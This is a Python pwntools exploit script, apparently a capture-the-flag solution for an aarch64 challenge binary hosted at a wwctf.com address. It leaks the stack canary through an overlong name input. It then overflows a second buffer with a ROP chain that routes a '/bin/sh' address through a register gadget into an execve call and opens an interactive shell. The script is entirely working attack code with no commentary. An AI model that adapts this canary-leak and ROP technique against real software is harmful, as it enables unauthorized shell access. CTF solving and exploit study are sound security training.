#!/usr/bin/env python3

from pwn import *

elf = ELF("./chal")
#libc = ELF("./")
#ld = ELF("./")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
context.arch = 'aarch64'
context.bits = 64
context.endian = 'little'
gs = '''
break *0x0000000000425ef0
'''
domain= "chal.wwctf.com"
port = 32873
def start():
    if args.REMOTE:
        return remote(domain, port)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])
r = start()

#========= exploit here ===================
gadget = 0x0000000000425ef0  # 0x0000000000425ef0: mov x0, x19; ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;
execve_syscall = 0x000000000044c35c 

# ** Leak stack canary **
r.recvuntil(b"name: ")
r.sendline(b"A"*64)
r.recvuntil(b"A"*64)
sc = r.recv(8)
sc = b"\x00" + sc[1:]
log.success(f"Stack canary leaked: {hex(u64(sc))}")

# ** Buffer overflow **
r.recvuntil(b"book: ")
payload = b"A"*32                  # offset
payload += sc                      # stack canary
payload += p64(0)                  # x29
payload += p64(gadget)             # x30

# store "/bin/sh\x00" address in x19
payload += p64(0) * 2                                # junk       **
payload += p64(0)                                    # x29        **
payload += p64(0x0000000000425ef0)                   # x30        ** 
payload += p64(next(elf.search(b"/bin/sh\x00")))     # x19        ** 
payload += p64(0)                                    # x20        ** 

bin_sh = next(elf.search(b"/bin/sh\x00"))


# 0x0000000000425ef0: mov x0, x19; ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret;
# store "/bin/sh\x00" address in x0
payload += p64(0)                                    # x29        **
payload += p64(0x000000000044c35c)                   # x30        ** 
payload += p64(next(elf.search(b"/bin/sh\x00")))     # x19        ** 
payload += p64(0)                                    # x20        ** 
payload += b"A"* 16                                  # junk       **

r.sendline(payload)

r.interactive()
